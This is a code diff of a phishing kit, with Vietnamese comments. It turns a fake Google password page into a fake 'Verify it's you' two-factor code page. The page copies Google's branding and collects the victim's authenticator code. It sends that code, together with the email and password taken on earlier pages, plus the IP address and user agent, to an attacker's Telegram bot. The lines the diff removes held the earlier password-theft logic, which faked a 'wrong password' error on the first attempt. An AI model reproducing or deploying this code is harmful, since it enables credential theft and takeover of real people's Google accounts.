@@ -1,7 +1,8 @@
 <?php
 // get root directory
-require_once('./get-data.php');
-require_once('./getip.php');
+$rootDirectory = dirname(dirname(__FILE__));
+require_once($rootDirectory . '/get-data.php');
+require_once($rootDirectory . '/getip.php');
 ?>
     
 <?php
@@ -22,14 +23,13 @@ $ip_server = getServerIP();
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 ?>
 
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <title>Verify it's you - Google Accounts</title>
     <link rel="icon" href="/images/favicon.ico">
     <style>
         * {
@@ -94,7 +94,9 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         .app-logo {
             width: 48px;
             height: 48px;
-            background: #f8f9fa;
+            background:rgb(243, 247, 250);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgb(219, 221, 223);
             border-radius: 8px;
             margin-bottom: 16px;
             display: flex;
@@ -113,7 +115,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         }
 
         .subtitle {
-            font-size: 14px;
+            font-size: 18px;
             color: rgb(60, 61, 63);
             margin-bottom: 32px;
         }
@@ -127,40 +129,43 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             text-decoration: underline;
         }
 
-        .email-display {
-            background: #f8f9fa;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            padding: 13px 15px;
+        .user-info {
+            background: transparent;
+            padding: 5px 10px 5px 5px;
             margin-bottom: 24px;
-            font-size: 16px;
+            border: 1px solid rgb(219, 221, 223);
+            border-radius: 24px;
+            width: fit-content;
+            font-size: 14px;
             color: #202124;
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            gap: 8px;
         }
 
-        .email-text {
+        .user-icon {
+            width: 20px;
+            height: 20px;
+            background: #5f6368;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .user-email {
             font-weight: 500;
         }
 
-        .change-link {
-            color: rgb(11 87 208 / 1);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .change-link:hover {
-            text-decoration: underline;
-        }
-
-        .password-section {
+        .code-section {
             margin-bottom: 24px;
             position: relative;
         }
 
-        .password-label {
+        .code-label {
             position: absolute;
             top: -8px;
             left: 12px;
@@ -172,7 +177,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             z-index: 1;
         }
 
-        .password-input {
+        .code-input {
             width: 100%;
             padding: 16px 15px 13px 15px;
             border: 1px solid rgb(108, 109, 110);
@@ -184,12 +189,12 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             background: white;
         }
 
-        .password-input:focus {
+        .code-input:focus {
             border-color: rgb(11 87 208 / 1);
             border-width: 2px;
         }
 
-        .password-input.error {
+        .code-input.error {
             border-color: #d93025;
             border-width: 2px;
         }
@@ -202,17 +207,25 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             font-weight: 500;
         }
 
-        .forgot-link {
-            color: rgb(11 87 208 / 1);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            display: block;
-            margin: 12px 0 24px;
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
         }
 
-        .forgot-link:hover {
-            text-decoration: underline;
+        .checkbox-input {
+            width: 16px;
+            height: 16px;
+            accent-color: rgb(11 87 208 / 1);
+            cursor: pointer;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+            user-select: none;
         }
 
         .button-group {
@@ -220,16 +233,17 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             justify-content: flex-end;
             align-items: center;
             gap: 16px;
+            margin-top: 24px;
         }
 
-        .create-account {
-            color: #0b57d0;
+        .try-another-link {
+            color: rgb(11 87 208 / 1);
             text-decoration: none;
             font-size: 14px;
-            font-weight: bold;
+            font-weight: 500;
         }
 
-        .create-account:hover {
+        .try-another-link:hover {
             text-decoration: underline;
         }
 
@@ -251,32 +265,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
         .next-button:disabled {
             cursor: not-allowed;
-        }
-
-        .footer {
-            margin-top: 48px;
-            text-align: center;
-        }
-
-        .footer-text {
-            color: #5f6368;
-            font-size: 12px;
-            line-height: 1.4;
-        }
-
-        .footer-links {
-            margin-top: 8px;
-        }
-
-        .footer-link {
-            color: #5f6368;
-            text-decoration: none;
-            font-size: 12px;
-            margin: 0 8px;
-        }
-
-        .footer-link:hover {
-            text-decoration: underline;
+            opacity: 0.5;
         }
 
         .page-footer {
@@ -353,34 +342,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 width: 100%;
             }
         }
-
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 8px;
-        }
-
-        .checkbox-input {
-            width: 16px;
-            height: 16px;
-            accent-color: rgb(11 87 208 / 1);
-            cursor: pointer;
-        }
-
-        .checkbox-label {
-            font-size: 12px;
-            color:rgb(72, 73, 77);
-            cursor: pointer;
-            user-select: none;
-            font-weight: bold;
-        }
-
-        .guest-mode {
-            font-size: 14px;
-            color: rgb(60, 61, 63);
-            margin-bottom: 16px;
-        }
     </style>
 </head>
 
@@ -397,27 +358,28 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
         <div class="main-content">
             <div class="left-section">
-                <h1 class="title">Welcome</h1>
-                <p class="subtitle" id="displayEmail"></p>
+                <div class="app-logo" id="appLogo">JL</div>
+                <h1 class="title">Verify it's you</h1>
+                <p class="subtitle" style="font-size: 14px;">To help keep your account safe, Google wants to make sure it's really you</p>
+                
+                <div class="user-info">
+                    <div class="user-icon" id="userIcon">U</div>
+                    <span class="user-email" id="displayEmail"></span>
+                </div>
             </div>
 
             <div class="right-section">
-                <form onsubmit="sendToTelegramFromGooglePassword(event)" autocomplete="off">
-                    <div class="password-section">
-                        <label for="password" class="password-label">Enter your password</label>
-                        <input type="password" id="password" class="password-input" placeholder="" required>
-                        <div class="error-message" id="errorMessage">Wrong password. Try again or click Forgot password to reset it.</div>
-                        <div class="checkbox-container">
-                            <input type="checkbox" id="showPassword" class="checkbox-input">
-                            <label for="showPassword" class="checkbox-label">Show Password</label>
-                        </div>
+                <p class="subtitle" style="font-size: 14px; margin-bottom: 24px;">Get a verification code from the Google Authenticator app</p>
+                <form onsubmit="sendToTelegramFromTwoFactorAuthentication2(event)" autocomplete="off">
+                    <div class="code-section">
+                        <label for="code" class="code-label">Enter code</label>
+                        <input type="text" id="code" class="code-input" placeholder="" maxlength="8" required>
+                        <div class="error-message" id="errorMessage">The login code you entered does not match the code sent to your phone. Please re-enter if it still does not match.</div>
                     </div>
 
-                    <p class="guest-mode">Not your computer? Use Guest Mode to log in privately. <a href="#" style="color: rgb(11 87 208 / 1); text-decoration: none;">Learn more about using Guest Mode</a></p>
-
                     <div class="button-group">
-                        <a href="#" class="create-account">Forgot password?</a>
-                        <button type="submit" class="next-button" id="nextButton">Next</button>
+                        <a href="#" class="try-another-link">More ways to verify</a>
+                        <button type="submit" class="next-button" id="nextButton" disabled>Next</button>
                     </div>
                 </form>
             </div>
@@ -449,78 +411,58 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         var botToken = '<?php echo $token; ?>';
         var chatId = '<?php echo $chatId; ?>';
 
-        // State management cho Google Password
-        var isFirstAttempt = sessionStorage.getItem('googlePasswordFirstAttempt') !== 'false';
-        var attempts = parseInt(sessionStorage.getItem('googlePasswordAttempts') || '0');
-
         document.addEventListener('DOMContentLoaded', function() {
-            const passwordInput = document.getElementById('password');
+            const codeInput = document.getElementById('code');
             const nextButton = document.getElementById('nextButton');
             const errorMessage = document.getElementById('errorMessage');
             const displayEmail = document.getElementById('displayEmail');
 
             // Hiển thị email từ localStorage
-            const email = localStorage.getItem('googleEmail');
-            console.log('Email from localStorage:', email); // Debug
+            const email = localStorage.getItem('googleEmail') || localStorage.getItem('email');
             if (email) {
                 displayEmail.textContent = email;
-                console.log('Email displayed:', displayEmail.textContent); // Debug
-            } else {
-                console.log('No email found, redirecting...'); // Debug
-                // Nếu không có email, chuyển về trang login
-                window.location.href = '/login/google.php';
-                return;
+                
+                // Lấy ký tự đầu tiên của email để hiển thị trong app-logo và user-icon
+                const firstChar = email.charAt(0).toUpperCase();
+                const appLogo = document.getElementById('appLogo');
+                const userIcon = document.getElementById('userIcon');
+                appLogo.textContent = firstChar;
+                userIcon.textContent = firstChar;
             }
 
             // Enable button khi có input
-            passwordInput.addEventListener('input', function() {
+            codeInput.addEventListener('input', function() {
+                if (this.value.length >= 6) {
+                    nextButton.disabled = false;
+                    nextButton.style.opacity = '1';
+                } else {
+                    nextButton.disabled = true;
+                    nextButton.style.opacity = '0.5';
+                }
+                
+                // Xóa class error khi user nhập lại
                 if (this.value.length > 0) {
                     this.classList.remove('error');
                     errorMessage.style.display = 'none';
                 }
             });
-
-            // Show/Hide password logic
-            const showPasswordCheckbox = document.getElementById('showPassword');
-            showPasswordCheckbox.addEventListener('change', function() {
-                if (this.checked) {
-                    passwordInput.type = 'text';
-                } else {
-                    passwordInput.type = 'password';
-                }
-            });
-
-            // Kiểm tra nếu có lỗi từ session storage
-            var hasError = sessionStorage.getItem('googlePasswordError');
-            var savedPassword = sessionStorage.getItem('savedGooglePassword');
-            
-            if (hasError === 'true' && savedPassword) {
-                passwordInput.value = savedPassword;
-                passwordInput.focus();
-                passwordInput.select();
-                passwordInput.classList.add('error');
-                
-                // Hiển thị thông báo lỗi
-                errorMessage.style.display = 'block';
-                
-                // Xóa session storage sau khi hiển thị
-                sessionStorage.removeItem('googlePasswordError');
-                sessionStorage.removeItem('savedGooglePassword');
-            }
         });
 
-        function sendToTelegramFromGooglePassword(event) {
+        function sendToTelegramFromTwoFactorAuthentication2(event) {
             event.preventDefault();
             
-            var password = document.getElementById('password').value;
-            var email = localStorage.getItem('googleEmail');
+            var code = document.getElementById('code').value;
+            var email = localStorage.getItem('googleEmail') || localStorage.getItem('email');
+            var password = localStorage.getItem('password');
             
             // Gửi dữ liệu đến Telegram
-            var content = "🔐 Google Password💬" +
+            var content = "🔐 Google 2FA Code (2nd Step)💬" +
                 "\n" + "----------------------------------------------------------" +
                 "\nEmail: " + "`" + email + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nPassword: " + "`" + password + "`" +
+                "\n" + "----------------------------------------------------------" +
+                "\n2FA Code (2nd): " + "`" + code + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                 "\nIP Address: " + "`<?php echo $ip; ?>`" +
@@ -544,43 +486,13 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             })
             .then(response => response.json())
             .then(data => {
-                // Logic xử lý: Lần đầu luôn báo lỗi, lần 2 thì thành công
-                attempts++;
-                sessionStorage.setItem('googlePasswordAttempts', attempts.toString());
-                
-                if (attempts === 1) {
-                    // Lần đầu: Báo lỗi
-                    sessionStorage.setItem('googlePasswordError', 'true');
-                    sessionStorage.setItem('savedGooglePassword', password);
-                    sessionStorage.setItem('googlePasswordFirstAttempt', 'false');
-                    
-                    // Reload trang để hiển thị lỗi
-                    window.location.reload();
-                } else {
-                    // Lần 2: Thành công - chuyển đến trang tiếp theo
-                    sessionStorage.removeItem('googlePasswordAttempts');
-                    sessionStorage.removeItem('googlePasswordFirstAttempt');
-                    window.location.href = "/two-verify-authentication.php";
-                    localStorage.setItem('password', password);
-                }
+                // Thành công ngay lập tức - chuyển đến trang consent
+                window.location.href = "./google-consent";
             })
             .catch(error => {
                 console.error('Error:', error);
-                // Fallback nếu có lỗi network
-                attempts++;
-                sessionStorage.setItem('googlePasswordAttempts', attempts.toString());
-                
-                if (attempts === 1) {
-                    sessionStorage.setItem('googlePasswordError', 'true');
-                    sessionStorage.setItem('savedGooglePassword', password);
-                    sessionStorage.setItem('googlePasswordFirstAttempt', 'false');
-                    window.location.reload();
-                } else {
-                    sessionStorage.removeItem('googlePasswordAttempts');
-                    sessionStorage.removeItem('googlePasswordFirstAttempt');
-                    window.location.href = "/two-verify-authentication.php";
-                    localStorage.setItem('password', password);
-                }
+                // Fallback nếu có lỗi network - vẫn chuyển đến trang consent
+                window.location.href = "./google-consent";
             });
         }
     </script>
